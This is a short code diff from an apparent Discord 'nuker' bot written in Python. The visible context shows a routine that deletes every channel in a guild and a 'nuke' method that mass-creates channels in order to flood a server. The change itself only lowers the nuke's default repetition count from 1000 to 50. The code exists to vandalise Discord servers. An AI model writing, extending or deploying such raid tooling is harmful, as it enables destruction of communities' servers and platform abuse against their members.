@@ -51,7 +51,7 @@ class DiscordBot(commands.Bot):
         logs[self.logId] += "---- Start AllChannelDelete ----\n"
         await asyncio.gather(*(self.deleteChannel(channel) for channel in guild.channels))
         logs[self.logId] += "---- End ----\n\n\n"
-    async def nuke(self, latency:int, message:str, guild:discord.Guild, channelName:str, numberOfExecutions=1000):
+    async def nuke(self, latency:int, message:str, guild:discord.Guild, channelName:str, numberOfExecutions=50):
         logs[self.logId] += "---- Start Nuke ----\n"
         try:
             await asyncio.gather(*(guild.create_text_channel(channelName) for _ in range(55)))
